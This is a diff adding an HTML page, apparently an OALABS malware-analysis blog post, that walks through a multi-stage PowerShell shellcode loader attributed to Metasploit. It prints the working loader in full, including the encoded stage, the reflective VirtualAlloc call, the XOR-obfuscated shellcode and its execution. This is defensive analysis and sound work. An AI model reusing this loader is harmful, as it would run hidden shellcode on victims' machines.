@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="twitter:card" content="summary_large_image" /><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>PowerShell Loading Shellcode | OALABS Research</title>
+<meta name="generator" content="Jekyll v4.1.1" />
+<meta property="og:title" content="PowerShell Loading Shellcode" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Taking a look at this loader which is probably metasploit lol" />
+<meta property="og:description" content="Taking a look at this loader which is probably metasploit lol" />
+<link rel="canonical" href="https://research.openanalysis.net/powershell/shellcode/noobsnight/2022/11/24/powershell-shellcode.html" />
+<meta property="og:url" content="https://research.openanalysis.net/powershell/shellcode/noobsnight/2022/11/24/powershell-shellcode.html" />
+<meta property="og:site_name" content="OALABS Research" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-11-24T00:00:00-06:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="PowerShell Loading Shellcode" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-11-24T00:00:00-06:00","datePublished":"2022-11-24T00:00:00-06:00","description":"Taking a look at this loader which is probably metasploit lol","headline":"PowerShell Loading Shellcode","mainEntityOfPage":{"@type":"WebPage","@id":"https://research.openanalysis.net/powershell/shellcode/noobsnight/2022/11/24/powershell-shellcode.html"},"url":"https://research.openanalysis.net/powershell/shellcode/noobsnight/2022/11/24/powershell-shellcode.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="https://research.openanalysis.net/feed.xml" title="OALABS Research" /><link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/Primer/15.2.0/primer.css" integrity="sha512-xTz2ys4coGAOz8vuV1NcQBkgVmKhsSEtjbqyMJbBHRplFuvKIUo6xhLHpAyPt9mfR6twHJgn9OgVLuqOvjeBhg==" crossorigin="anonymous" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.14.0/css/all.min.css" integrity="sha512-1PKOgIY59xJ8Co8+NE6FZ+LOAZKjy+KY8iq0G4B3CyeY6wYHN3yt9PW0XpSriVlkMXe40PTKnXrLnZ9+fkDaog==" crossorigin="anonymous" />
+
+<script>
+function wrap_img(fn) {
+    if (document.attachEvent ? document.readyState === "complete" : document.readyState !== "loading") {
+        var elements = document.querySelectorAll(".post img");
+        Array.prototype.forEach.call(elements, function(el, i) {
+            if (el.getAttribute("title") && (el.className != "emoji")) {
+                const caption = document.createElement('figcaption');
+                var node = document.createTextNode(el.getAttribute("title"));
+                caption.appendChild(node);
+                const wrapper = document.createElement('figure');
+                wrapper.className = 'image';
+                el.parentNode.insertBefore(wrapper, el);
+                el.parentNode.removeChild(el);
+                wrapper.appendChild(el);
+                wrapper.appendChild(caption);
+            }
+        });
+    } else { document.addEventListener('DOMContentLoaded', fn); }
+}
+window.onload = wrap_img;
+</script>
+
+<script>
+    document.addEventListener("DOMContentLoaded", function(){
+    // add link icon to anchor tags
+    var elem = document.querySelectorAll(".anchor-link")
+    elem.forEach(e => (e.innerHTML = '<i class="fas fa-link fa-xs"></i>'));
+    });
+</script>
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">OALABS Research</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/search/">Search</a><a class="page-link" href="/categories/">Tags</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">PowerShell Loading Shellcode</h1><p class="page-description">Taking a look at this loader which is probably metasploit lol</p><p class="post-meta post-meta-title"><time class="dt-published" datetime="2022-11-24T00:00:00-06:00" itemprop="datePublished">
+        Nov 24, 2022
+      </time>
+       • <span class="read-time" title="Estimated read time">
+    
+    
+      1 min read
+    
+</span></p>
+
+    
+      <p class="category-tags"><i class="fas fa-tags category-tags-icon"></i></i> 
+      
+        <a class="category-tags-link" href="/categories/#powershell">powershell</a>
+        &nbsp;
+      
+        <a class="category-tags-link" href="/categories/#shellcode">shellcode</a>
+        &nbsp;
+      
+        <a class="category-tags-link" href="/categories/#noobsnight">noobsnight</a>
+        
+      
+      </p>
+    
+
+    
+      
+        <div class="pb-5 d-flex flex-justify-left">
+            <div class="px-2">
+                <a href="https://www.youtube.com/c/OALabs" role="button" target="_blank">
+                    <img class="notebook-badge-image" src="https://img.shields.io/badge/-YouTube-FF0000" alt="Join us on YouTube">
+                </a>
+            </div>
+            <div class="px-2">
+                <a href="https://www.twitch.tv/oalabslive" role="button" target="_blank">
+                    <img class="notebook-badge-image" src="https://img.shields.io/twitch/status/oalabslive?style=social" alt="Join us on Twitch">
+                </a>
+            </div>
+            <div class="px-2">
+                <a href="https://discord.gg/cw4U3WHvpn" role="button" target="_blank">
+                    <img class="notebook-badge-image" src="https://img.shields.io/badge/-Join Our Discord-blueviolet" alt="Join Discord">
+                </a>
+            </div>
+            <div class="px-2">
+                <a href="https://www.patreon.com/oalabs" role="button" target="_blank">
+                    <img class="notebook-badge-image" src="https://img.shields.io/badge/-OALABS Patreon-FF424D" alt="Support us on Patreon">
+                </a>
+            </div>
+          <div class="px-2">
+
+    <a href="https://github.com/OALabs/research/tree/master/_notebooks/2022-11-24-powershell-shellcode.ipynb" role="button" target="_blank">
+<img class="notebook-badge-image" src="/assets/badges/github.svg" alt="View On GitHub">
+    </a>
+</div>
+
+          
+          
+          
+        </div>
+      </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <ul id="toc" class="section-nav">
+<li class="toc-entry toc-h2"><a href="#Overview">Overview </a></li>
+<li class="toc-entry toc-h2"><a href="#Analysis">Analysis </a>
+<ul>
+<li class="toc-entry toc-h3"><a href="#PowerShell-Analysis">PowerShell Analysis </a>
+<ul>
+<li class="toc-entry toc-h4"><a href="#Stage-1">Stage 1 </a></li>
+<li class="toc-entry toc-h4"><a href="#Stage-2">Stage 2 </a></li>
+<li class="toc-entry toc-h4"><a href="#Stage-3">Stage 3 </a></li>
+</ul>
+</li>
+<li class="toc-entry toc-h3"><a href="#Shellcode-Analysis">Shellcode Analysis </a></li>
+</ul>
+</li>
+</ul><!--
+#################################################
+### THIS FILE WAS AUTOGENERATED! DO NOT EDIT! ###
+#################################################
+# file to edit: _notebooks/2022-11-24-powershell-shellcode.ipynb
+-->
+
+<div class="container" id="notebook-container">
+        
+<div class="cell border-box-sizing text_cell rendered">
+<div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h2 id="Overview">
+<a class="anchor" href="#Overview" aria-hidden="true"><span class="octicon octicon-link"></span></a>Overview<a class="anchor-link" href="#Overview"> </a>
+</h2>
+<p>We have this PowerShell script that will eventually deploy some shellcode. Our job is to analyze this, and learn a little along the way.</p>
+<p><a href="https://paste.ee/p/lsDS3">Sample</a></p>
+
+</div>
+</div>
+</div>
+<div class="cell border-box-sizing text_cell rendered">
+<div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h2 id="Analysis">
+<a class="anchor" href="#Analysis" aria-hidden="true"><span class="octicon octicon-link"></span></a>Analysis<a class="anchor-link" href="#Analysis"> </a>
+</h2>
+</div>
+</div>
+</div>
+<div class="cell border-box-sizing text_cell rendered">
+<div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h3 id="PowerShell-Analysis">
+<a class="anchor" href="#PowerShell-Analysis" aria-hidden="true"><span class="octicon octicon-link"></span></a>PowerShell Analysis<a class="anchor-link" href="#PowerShell-Analysis"> </a>
+</h3>
+<p>We used cyberchef to do our analysis, the saved recipe can be used to extact similar loaders, just rememeber to change the XOR key.</p>
+<p><a href="https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false">CyberChef Recipe</a>Decode_text('UTF-16LE%20(1200)')Regular_expression('User%20defined','(%5Ba-zA-Z0-9%2B/%5D(%3D)%7B0,2%7D)%7B40,%7D',true,true,false,false,false,false,'List%20matches')From_Base64('A-Za-z0-9%2B/%3D',true,false)Gunzip()Regular_expression('User%20defined','(%5Ba-zA-Z0-9%2B/%5D(%3D)%7B0,2%7D)%7B40,%7D',true,true,false,false,false,false,'List%20matches')From_Base64('A-Za-z0-9%2B/%3D',true,false)XOR(%7B'option':'Decimal','string':'35'%7D,'Standard',false))</p>
+<h4 id="Stage-1">
+<a class="anchor" href="#Stage-1" aria-hidden="true"><span class="octicon octicon-link"></span></a>Stage 1<a class="anchor-link" href="#Stage-1"> </a>
+</h4>
+<p>The sample comes as a <strong>base64</strong> encoded blob containing wide string PowerShell code.</p>
+<div class="highlight"><pre><span></span><span class="nx">$s</span><span class="o">=</span><span class="nx">New</span><span class="o">-</span><span class="nb">Object</span> <span class="nx">IO</span><span class="p">.</span><span class="nx">MemoryStream</span><span class="p">(,[</span><span class="nx">Convert</span><span class="p">]</span><span class="o">::</span><span class="nx">FromBase64String</span><span class="p">(</span><span class="s2">"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"</span><span class="p">));</span>
+
+<span class="nx">IEX</span> <span class="p">(</span><span class="nx">New</span><span class="o">-</span><span class="nb">Object</span> <span class="nx">IO</span><span class="p">.</span><span class="nx">StreamReader</span><span class="p">(</span><span class="nx">New</span><span class="o">-</span><span class="nb">Object</span> <span class="nx">IO</span><span class="p">.</span><span class="nx">Compression</span><span class="p">.</span><span class="nx">GzipStream</span><span class="p">(</span><span class="nx">$s</span><span class="p">,[</span><span class="nx">IO</span><span class="p">.</span><span class="nx">Compression</span><span class="p">.</span><span class="nx">CompressionMode</span><span class="p">]</span><span class="o">::</span><span class="nx">Decompress</span><span class="p">))).</span><span class="nx">ReadToEnd</span><span class="p">();</span>
+</pre></div>
+<h4 id="Stage-2">
+<a class="anchor" href="#Stage-2" aria-hidden="true"><span class="octicon octicon-link"></span></a>Stage 2<a class="anchor-link" href="#Stage-2"> </a>
+</h4>
+<p>Once the first stage has been decoded we have some more <strong>base64</strong> encoded PowerShell that is also <strong>gzip</strong> compressed.</p>
+<div class="highlight"><pre><span></span><span class="nx">Set</span><span class="o">-</span><span class="nx">StrictMode</span> <span class="o">-</span><span class="nx">Version</span> <span class="mf">2</span>
+
+<span class="nx">$DoIt</span> <span class="o">=</span> <span class="err">@</span><span class="s1">'</span>
+<span class="s1">function func_get_proc_address {</span>
+<span class="s1">    Param ($var_module, $var_procedure)     </span>
+<span class="s1">    $var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('</span><span class="err">\\</span><span class="s1">')[-1].Equals('</span><span class="nx">System</span><span class="p">.</span><span class="nx">dll</span><span class="s1">') }).GetType('</span><span class="nx">Microsoft</span><span class="p">.</span><span class="nx">Win32</span><span class="p">.</span><span class="nx">UnsafeNativeMethods</span><span class="s1">')</span>
+<span class="s1">    $var_gpa = $var_unsafe_native_methods.GetMethod('</span><span class="nx">GetProcAddress</span><span class="s1">', [Type[]] @('</span><span class="nx">System</span><span class="p">.</span><span class="nx">Runtime</span><span class="p">.</span><span class="nx">InteropServices</span><span class="p">.</span><span class="nx">HandleRef</span><span class="s1">', '</span><span class="nx">string</span><span class="s1">'))</span>
+<span class="s1">    return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('</span><span class="nx">GetModuleHandle</span><span class="s1">')).Invoke($null, @($var_module)))), $var_procedure))</span>
+<span class="s1">}</span>
+
+<span class="s1">function func_get_delegate_type {</span>
+<span class="s1">    Param (</span>
+<span class="s1">        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,</span>
+<span class="s1">        [Parameter(Position = 1)] [Type] $var_return_type = [Void]</span>
+<span class="s1">    )</span>
+
+<span class="s1">    $var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('</span><span class="nx">ReflectedDelegate</span><span class="s1">')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('</span><span class="nx">InMemoryModule</span><span class="s1">', $false).DefineType('</span><span class="nx">MyDelegateType</span><span class="s1">', '</span><span class="nx">Class</span><span class="p">,</span> <span class="nx">Public</span><span class="p">,</span> <span class="nx">Sealed</span><span class="p">,</span> <span class="nx">AnsiClass</span><span class="p">,</span> <span class="nx">AutoClass</span><span class="s1">', [System.MulticastDelegate])</span>
+<span class="s1">    $var_type_builder.DefineConstructor('</span><span class="nx">RTSpecialName</span><span class="p">,</span> <span class="nx">HideBySig</span><span class="p">,</span> <span class="nx">Public</span><span class="s1">', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('</span><span class="nx">Runtime</span><span class="p">,</span> <span class="nx">Managed</span><span class="s1">')</span>
+<span class="s1">    $var_type_builder.DefineMethod('</span><span class="nx">Invoke</span><span class="s1">', '</span><span class="nx">Public</span><span class="p">,</span> <span class="nx">HideBySig</span><span class="p">,</span> <span class="nx">NewSlot</span><span class="p">,</span> <span class="nx">Virtual</span><span class="s1">', $var_return_type, $var_parameters).SetImplementationFlags('</span><span class="nx">Runtime</span><span class="p">,</span> <span class="nx">Managed</span><span class="s1">')</span>
+
+<span class="s1">    return $var_type_builder.CreateType()</span>
+<span class="s1">}</span>
+
+<span class="s1">[Byte[]]$var_code = [System.Convert]::FromBase64String('</span><span class="mf">38</span><span class="nx">uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs</span><span class="o">/</span><span class="nx">IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV</span><span class="o">+</span><span class="nx">EuNJY0sjMyMjS9zcJCNJI0t7h3DG3PZzyosjIyN5EupycksjkycjSyOTJyNJIkklSSBxS2ZT</span><span class="o">/</span><span class="nx">Pfc9nOoNwdJI3FLC0xewdz2puNXTUkjSSNJI6rFoOUnqsGg4SuoXwcvSSN1SSdxdEuOvXyY3PaodwczSSN1SyMDIyNxdEuOvXyY3Pam41c3qG8HJ6gnByLrqicHqHcHMyLhyPSoXwcvdEvj2f7f3PZ0S</span><span class="o">+</span><span class="nx">W1pHHc9qgnB6hvBysa4lckS9OWgXXc9txHBzPLcNzc3H9</span><span class="o">/</span><span class="nx">DX9TSlNGf05MSUwNFhUbGw0bExYRDRAWFBsTERQQEBEaEBQTFxQQEBMjL2yHcQ</span><span class="o">==</span><span class="s1">')</span>
+
+<span class="s1">for ($x = 0; $x -lt $var_code.Count; $x++) {</span>
+<span class="s1">    $var_code[$x] = $var_code[$x] -bxor 35</span>
+<span class="s1">}</span>
+
+<span class="s1">$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))</span>
+<span class="s1">$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)</span>
+<span class="s1">[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)</span>
+
+<span class="s1">$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))</span>
+<span class="s1">$var_runme.Invoke([IntPtr]::Zero)</span>
+<span class="s1">'</span><span class="err">@</span>
+
+<span class="nx">If</span> <span class="p">([</span><span class="nx">IntPtr</span><span class="p">]</span><span class="o">::</span><span class="nx">size</span> <span class="o">-</span><span class="nx">eq</span> <span class="mf">8</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">start</span><span class="o">-</span><span class="nx">job</span> <span class="p">{</span> <span class="nx">param</span><span class="p">(</span><span class="nx">$a</span><span class="p">)</span> <span class="nx">IEX</span> <span class="nx">$a</span> <span class="p">}</span> <span class="o">-</span><span class="nx">RunAs32</span> <span class="o">-</span><span class="nx">Argument</span> <span class="nx">$DoIt</span> <span class="o">|</span> <span class="nx">wait</span><span class="o">-</span><span class="nx">job</span> <span class="o">|</span> <span class="nx">Receive</span><span class="o">-</span><span class="nx">Job</span>
+<span class="p">}</span>
+<span class="k">else</span> <span class="p">{</span>
+    <span class="nx">IEX</span> <span class="nx">$DoIt</span>
+<span class="p">}</span>
+</pre></div>
+<h4 id="Stage-3">
+<a class="anchor" href="#Stage-3" aria-hidden="true"><span class="octicon octicon-link"></span></a>Stage 3<a class="anchor-link" href="#Stage-3"> </a>
+</h4>
+<p>The final PowerShell stage is used to <strong>base64</strong> decode and XOR decrypt shellcode that is loaded as the final stage.</p>
+
+</div>
+</div>
+</div>
+<div class="cell border-box-sizing text_cell rendered">
+<div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h3 id="Shellcode-Analysis">
+<a class="anchor" href="#Shellcode-Analysis" aria-hidden="true"><span class="octicon octicon-link"></span></a>Shellcode Analysis<a class="anchor-link" href="#Shellcode-Analysis"> </a>
+</h3>
+<p><a href="https://malshare.com/sample.php?action=detail&amp;hash=2eb435f69a445e4ca80fb0353d067dcd9d4b0dbf757978d46c27a5dd147a2ae8">2eb435f69a445e4ca80fb0353d067dcd9d4b0dbf757978d46c27a5dd147a2ae8</a></p>
+
+</div>
+</div>
+</div>
+<div class="cell border-box-sizing text_cell rendered">
+<div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<p>The shellcode containst functionality to download and run a second stage (shellcode) using a hard coded named pipe <code>\.\pipe\mojo.5688.8052.3578027332937047330</code>. To resolved APIs the shellcode uses the old Metasploit ROT-13 hash resolving algorithm.</p>
+<p>One interesting trick observed in the shellcode is the use of that return address on the stack to pass arguments to non-returning functions.</p>
+
+</div>
+</div>
+</div>
+</div>
+
+
+
+  </div><a class="u-url" href="/powershell/shellcode/noobsnight/2022/11/24/powershell-shellcode.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+        <p class="feed-subscribe">
+          <a href="/feed.xml">
+            <svg class="svg-icon orange">
+              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
+            </svg><span>Subscribe</span>
+          </a>
+        </p>
+      </div>
+      <div class="footer-col">
+        <p></p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"></ul>
+</div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
